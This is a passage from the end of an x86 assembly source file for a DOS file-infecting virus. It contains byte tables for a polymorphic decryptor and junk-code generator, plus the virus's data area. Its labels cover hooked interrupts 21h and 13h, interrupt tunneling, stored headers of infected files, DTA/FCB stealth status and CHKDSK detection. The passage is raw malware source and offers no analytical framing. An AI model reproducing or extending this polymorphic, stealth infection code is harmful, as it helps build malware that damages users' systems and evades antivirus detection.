               ; of the ones placed in the rda_to_part_2

           db 0A9h ; garbage without bx,dx
           db    2 ; copy two bytes

           db  18h ;
           db 0EFh ;
           db    2 ; copy two bytes

           db 0A8h ; garbage without bx,dx,ax
           db    2 ; copy two bytes

           db 0EFh ; free garbage
           db    2 ; copy two bytes

           db 0A9h ; ...
           db    2 ;

           db 0AFh ;
           db    2 ;

           db 0AEh ;
           db    4 ;

           db 0AFh ;
           db    2 ;

           db 0AEh ;
           db    3 ;

           db  12h ;
           db 0AFh ;
           db    3 ;

           db  18h ;
           db 0AFh ;
           db    2 ;

           db  18h ;
           db 0EFh ;
           db    3 ;

           db 0AEh ;
           db    3 ;

           db  18h ;
           db 0AEh ;
           db    3 ;

           db 0ADh ;
           db    2 ;

           db 0ACh ;
           db    3 ;

           db  18h ;
           db 0ACh ;
           db    3 ;

           db 0ADh ;
           db    2 ;

           db 0ACh ;
           db    3 ;

           db  18h ;
           db 0ACh ;
           db    3 ;

           db 0A9h ;
           db    2 ;

           db 0A8h ;
           db    3 ;

           db  18h ;
           db 0A8h ;
           db    3 ;

           db 0A9h ;
           db    2 ;

           db  18h ;
           db 0EFh ;
           db    3 ;

           db 0AEh ;
           db    2 ;

           db 0A9h ;
           db    2 ;

           db  11h ;
           db 0ABh ;
           db    4 ;

           db  11h ;
           db 0AFh ;
           db    4 ;

           db 0A9h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0EFh ;
           db    2 ;

           db  12h ;

           db 0AEh ;
           db    3 ;

           db  18h ;
           db 0AEh ;
           db    2 ;

           db  18h ;
           db 0EFh ;
           db    3 ;

           db 0AEh ;
           db    2 ;

           db 0AEh ;
           db    3 ;

           db  18h ;
           db 0ABh ;
           db    3 ;

           db 0AAh ;
           db    2 ;

           db 0A6h ;
           db    2 ;

           db 0A2h ;
           db    2 ;

           db  12h ;
           db 0A2h ;
           db    4 ;

           db  18h ;
           db 0A2h ;
           db    2 ;

           db 0AAh ;
           db    3 ;

           db 0AEh ;
           db    2 ;

           db 0AEh ;
           db    2 ;

           db 0EFh ;
           db    2 ;

           db  11h ;
           db 0AEh ;
           db    4 ;

           db  11h ;
           db 0A6h ;
           db    4 ;

           db 0A4h ;
           db    2 ;

           db 0A0h ;
           db    3 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0A0h ;
           db    2 ;

           db 0AAh ;
           db    2 ;

           db 0AAh ;
           db    3 ;

           db 0AAh ;
           db    3 ;

           db  11h ;
           db 0AAh ;
           db    4 ;

           db  11h ;
           db 0AAh ;
           db    4 ;

           db 0EFh ;
           db    2 ;

           db  13h ;
           db 0AFh ;
           db    5 ;

           db  18h ;
           db 0AFh ;
           db    2 ;

           db  18h ;
           db 0EFh ;
           db    3 ;

           db  11h ;
           db 0AEh ;
           db    4 ;

           db  11h ;
           db 0AFh ;
           db    4 ;

           db  11h ;
           db 0AEh ;
           db    4 ;

           db  11h ;
           db  2Eh ;
           db    4 ;

           db  11h ;
           db  2Eh ;
           db    4 ;

           db  18h ;
           db 0EFh ;
           db    3 ;

           db  11h ;
           db 0AEh ;
           db    4 ;

           db  11h ;
           db 0AFh ;
           db    4 ;

           db  11h ;
           db 0AEh ;
           db    4 ;

           db  11h ;
           db 0AEh ;
           db    4 ;

           db 0A6h ;
           db    2 ;

           db 0A4h ;
           db    3 ;

           db 0A4h ;
           db    2 ;

           db  12h ;
           db 0A4h ;
           db    2 ;

           db 0A4h ;
           db    3 ;

           db  18h ;
           db 0A7h ;
           db    2 ;

           db 0AEh ;
           db    2 ;

           db  2Eh ;
           db    3 ;

           db  11h ;
           db  2Eh ;
           db    4 ;

           db  2Eh ;
           db    2 ;

           db  11h ;
           db  2Eh ;
           db    5 ;

           db  11h ;
           db  2Eh ;
           db    4 ;

           db  0Eh ;
           db    2 ;

           db  12h ;
           db  0Eh ;
           db    2 ;

           db  18h ;
           db  0Eh ;
           db    2 ;

           db  18h ;
           db 0EFh ;
           db    3 ;

           db  0Eh ;
           db    3 ;

           db  0Ch ;
           db    2 ;

           db  11h ;
           db  0Ch ;
           db    4 ;

           db  0Ch ;

           db    2 ;

           db  0Eh ;
           db    2 ;

           db  11h ;
           db  0Eh ;
           db    4 ;

           db  11h ;
           db    0 ;
           db    5 ;

           db  0Eh ;
           db    2 ;

           db  0Eh ;
           db    4 ;

           db  11h ;
           db  0Ch ;
           db    4 ;

           db  0Ch ;
           db    2 ;

           db  11h ;
           db    4 ;
           db    4 ;

           db    0 ;
           db    3 ;

           db    0 ;
           db    2 ;

           db  15h ;
           db 0AFh ;
           db    4 ;

           db  14h ;
           db 0AFh ;
           db    5 ;

           db  14h ;
           db 0AFh ;
           db    2 ;

           db  18h ;
           db    0 ;
           db    3 ;

           db  0Ah ;
           db    2 ;

           db  0Ah ;
           db    3 ;

           db  0Ah ;
           db    2 ;

           db  12h ;
           db  0Ah ;
           db    2 ;

           db  18h ;
           db  0Ah ;
           db    2 ;

           db  18h ;
           db 0EFh ;
           db    3 ;

           db 0AFh ;
           db    2 ;

           db  11h ;
           db 0AFh ;
           db    6 ;

           db  11h ;
           db 0AFh ;
           db    6 ;

           db  11h ;
           db 0AFh ;
           db    4 ;

           db 0EFh ;
           db    2 ;

           db  11h ;
           db 0ADh ;
           db    4 ;

           db 0ADh ;
           db    2 ;

           db  11h ;
           db  2Dh ;
           db    4 ;

           db  29h ;
           db    3 ;

           db    9 ;
           db    3 ;

           db    8 ;
           db    3 ;

           db    8 ;
           db    2 ;

           db  14h ;
           db 0AFh ;
           db    2 ;

           db  14h ;
           db 0AFh ;
           db    3 ;

           db  14h ;
           db 0AFh ;
           db    2 ;

           db  14h ;
           db 0AFh ;
           db    2 ;

           db  14h ;
           db 0AFh ;
           db    2 ;

           db  14h ;
           db 0AFh ;
           db    3 ;

           db  14h ;
           db 0AFh ;
           db    2 ;

           db  14h ;
           db 0AFh ;
           db    2 ;

           db  14h ;
           db 0AFh ;
           db    4 ;

           db  18h ;
           db  8Bh ;
           db    2 ;

           db 0ABh ;
           db    2 ;

           db  11h ;
           db 0ABh ;
           db    6 ;

           db  11h ;
           db 0ABh ;
           db    6 ;

           db 0EFh ;
           db    2 ;

           db 0AEh ;
           db    2 ;

           db 0AEh ;
           db    4 ;

           db 0AFh ;
           db    2 ;

           db  18h ;
           db 0EFh ;
           db    3 ;

           db  11h ;
           db 0AFh ;
           db    5 ;

           db  18h ;
           db 0AFh ;
           db    3 ;

           db  13h ;
           db 0AFh ;
           db    4 ;

           db  18h ;
           db 0AFh ;
           db    2 ;

           db  18h ;
           db 0AFh ;
           db    3 ;

           db  11h ;
           db 0AEh ;
           db    4 ;

           db  18h ;
           db 0AEh ;
           db    3 ;

           db  11h ;
           db 0AFh ;
           db    4 ;

           db  11h ;
           db 0AFh ;
           db    5 ;

           db  18h ;
           db 0AFh ;
           db    3 ;

           db  11h ;
           db 0AEh ;
           db    4 ;

           db  18h ;
           db 0AEh ;
           db    3 ;

           db 0A7h ;
           db    2 ;

           db 0A7h ;
           db    4 ;

           db  11h ;
           db  2Fh ;
           db    4 ;

           db  2Eh ;
           db    2 ;

           db  11h ;
           db  2Fh ;
           db    4 ;

           db 0AEh ;
           db    3 ;

           db  11h ;
           db 0AFh ;
           db    4 ;

           db  18h ;
           db 0ABh ;
           db    3 ;

           db  11h ;
           db  2Bh ;
           db    4 ;

           db  12h ;
           db 0AFh ;
           db    7 ;

           db  18h ;
           db 0AFh ;
           db    2 ;

           db  18h ;
           db    0 ;
           db    3 ;

           db    0 ;
           db    2 ;

   rda_from_table_part_1:
           db  33h ; xor dx,ax
           db 0D0h ;
           db    3 ; add bp,ax
           db 0E8h ;

           db  2Bh ; sub dx,ax
           db 0D0h ;
           db  33h ; xor bp,ax
           db 0E8h ;

           db    3 ; add dx,ax
           db 0D0h ;
           db  33h ; xor bp,dx
           db 0EAh ;

           db  33h ; xor dx,ax
           db 0D0h ;
           db  2Bh ; sub bp,ax
           db 0E8h ;

           db  33h ; xor dx,ax
           db 0D0h ;
           db  33h ; xor bp,ax
           db 0E8h ;

           db    3 ; add dx,ax
           db 0D0h ;
           db  2Bh ; sub bp,ax
           db 0E8h ;

           db    3 ; add dx,ax
           db 0D0h ;
           db  33h ; xor bp,ax
           db 0E8h ;

           db  33h ; xor dx,ax
           db 0D0h ;
           db  2Bh ; sub bp,ax
           db 0E8h ;

   rda_from_table_part_1_end:


   rda_from_table_part_2:
           db  31h ; xor [bx],dx
           db  17h ;
           db 0D3h ; ror word ptr [bx],cl
           db  0Fh ;

           db 0D3h ; rol word ptr [bx],cl
           db    7 ;
           db  29h ; sub [bx],dx
           db  17h ;

           db    1 ; add [bx],dx
           db  17h ;
           db 0F7h ; neg word ptr [bx]
           db  1Fh ;

           db 0F7h ; not word ptr [bx]
           db  17h ;
           db 0FFh ; inc word ptr [bx]
           db    7 ;

           db 0FFh ; dec word ptr [bx]
           db  0Fh ;
           db 0D1h ; ror word ptr [bx],1
           db  0Fh ;

           db 0D1h ; rol word ptr [bx],1
           db    7 ;
           db 0D1h ; ror word ptr [bx],1
           db  0Fh ;

           db 0D1h ; rol word ptr [bx],1
           db    7 ;
           db 0FFh ; inc word ptr [bx]
           db    7 ;

           db 0FFh ; dec word ptr [bx]
           db  0Fh ;
           db 0F7h ; not word ptr [bx]
           db  17h ;

           db 0F7h ; neg word ptr [bx]
           db  1Fh ;
           db  29h ; sub [bx],dx
           db  17h ;

           db    1 ; add [bx],dx
           db  17h ;
           db 0D3h ; ror word ptr [bx],cl
           db  0Fh ;

           db 0D3h ; rol word ptr [bx],cl
           db    7 ;
           db  31h ; xor [bx],dx
           db  17h ;

   rda_from_table_part_2_end:
   first_data   db      ?
   second_data  db      ?
   code_end:
   cache_stat   db      ?           ; Status of disk cache
   int21_addr   dd      ?           ; Address of interrupt 21h
   int08_addr   dd      ?           ; Address of interrupt 08h
            db      04h dup(?)
   tunnel_addr  dd      ?           ; Address of tunneled interrupt
   tun_exit_off dw      ?           ; Offset of tunneled interrupt exit
   sp_      dw      ?           ; Stack pointer
   tun_int_stat db      ?           ; Status of the tunneled interrupt
   tunnel_stat  db      ?           ; Status of tunneling
   int21_addr_  dd      ?           ; Address of interrupt 21h
   int13_addr   dd      ?           ; Address of interrupt 13h
   tun_i13_stat db      ?           ; Status of tunneling interrupt 13h
   virus_offset equ     word ptr $+01h  ; Offset of virus within infected ....
   file_header_ db      1ah dup(?)      ; File header
   int01_addr   dd      ?           ; Address of interrupt 01h
   int03_addr   dd      ?           ; Address of interrupt 03h
   int2a_addr   dd      ?           ; Address of interrupt 2ah
   int13_addr_  dd      ?           ; Address of interrupt 13h
   int24_addr   dd      ?           ; Address of interrupt 24h
   int21_addr__ dd      ?           ; Address of interrupt 21h
   int01_addr_  dd      ?           ; Address of interrupt 01h
   all_regs_initial_pnt    dw  00h ; all regs are initialized at this
                       ; point
   file_attr    dw      ?           ; File attributes
   file_date    dw      ?           ; File's date
   file_time    dw      ?           ; File's time
   using_8_bits_register   db  00h
   register_compat     db  00h ; for byte and for word
               db  00h
   garbage_register    db  00h ; register to be used
   garbage_word_byte   dw  00h ; 00h byte, 01h word
   mops_tmptable       db  10h dup (00)    ; math ops generated (ref to
                           ; the table)
   rda_garbage_limits  db  00h ; limit the garbage in the rda steps
                       ; to some given classes
   poly_reg_di     dw  00h
   layer_di_pointer    dw  00h ; value of DI, destination for code
                       ; generation for this layer
   poly_actual_layer   dw  00h ; number of layer actually building
   poly_layer_nr       db  00h ; number of layers to create
   pointer_direction   db  00h
   tipo_register       dw  00h
   counter_direction   dw  00h ;
   counter_register    db  00h ;
   pointer_register    db  00h
   restrict_grb_ax_is_used db  00h ; 01h restrict since ax is used
                       ; 00h can create all kinda grg almost
   layer_sp_pointer    dw  00h ; value of SP of this layer, that is
                       ; pointer to the layer data on stack
   howmany_from_used_table dw  00h
   poly_reg_si     dw  00h
   poly_total_lenght   dw  00h
   poly_reg_cx     dw  00h ; body lenght for poly, initial CX
   poly_reg_bx     dw  00h
   pointer_assign_pos  dw  00h ; where the pointer is assigned
   counter_assign_pos  dw  00h ; where the counter is assigned
   garbage_instr_number    db  00h
   counter_check_pos   dw  00h ; where the comparation for the loop
                       ; exit is done
   dec_loop_begin_pos  dw  00h ; pointer to begin of dec loop
   pointer_to_end_after_rda_2 dw   00h
   rda_add_to_lenght_rnd   dw  00h
   pnt_to_end_after_rda    dw  00h ; pointer to end of everything after
                       ; the rda execution
   dec_loop_end_pos    dw  00h ; pointer to end of dec loop
   decryptor_ended_inmem_pnt dw    00h ; to the end of decryptor in mem
           db     ?
   create_or_just_read db  00h ;
   math_seq_stack_off  dw  00h
   filesize     dd        ?         ; Filesize
   reloca_entry dd        ?         ; Relocation entry
   pointer_to_used_table   dw  00h ; for the routine that gets a pointer
                       ; to a table as a parameter
   grb_jump_place      dw  00h ; offset where to put jump, used for
                       ; garbage generation
   end_most_internal_layer dw  00h ; pointer to the end of the most
                       ; internal layer in mem
   dumb_cntr_ass       dw  00h
   ss__         dw      ?           ; Stack segment (SS)
   sp__         dw      ?           ; Stack pointer (SP)
   chkdsk_stat  db      ?           ; Status of CHKDSK.EXE
   filesize_    dw      ?           ; Filesize
   filenam_addr dw      ?           ; Address of filename
   dta_fcb_stat db      ?           ; Status of DTA or FCB stealth
   filename     db      0dh dup(?)      ; Filename
            db      05h dup(?)
   rda_address_buffer:         ; the adresses of each generated step
                       ; will be inserted after this point
            db      27fh dup(?)
   ecc_temp_buffer:
            db      90h dup(?)
   data_buffer:
            db      5abfh dup(?)
   stack_ptr:
   data_end__:

   end      code_begin
